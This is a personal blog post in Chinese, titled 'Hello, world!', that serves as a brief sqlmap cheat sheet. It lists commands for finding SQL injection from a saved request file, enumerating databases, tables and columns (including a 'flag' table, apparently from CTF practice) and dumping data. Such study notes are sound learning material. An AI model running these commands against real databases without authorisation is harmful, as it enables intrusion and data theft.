---
title: 你好，世界！
date: 2022-03-26 10:34:00 +0800
categories: [随笔]
tags: [生活]
pin: true
author: 理性暗面

toc: true
comments: true
typora-root-url: ../../lixanm.github.io
math: false
mermaid: true

image:
  src:
  alt: 
---

# sqlmap

python sqlmap.py -r r.txt	//找漏洞

python sqlmap.py -r r.txt -current-db	//找库

python sqlmap.py -r r.txt --tables -D sql_test	//找库下的文件

python sqlmap.py -r r.txt --columns -T flag -D sql_test	//找文件下的字段

python sqlmap.py --purge

python sqlmap.py -r r.txt --dump	//查找数据









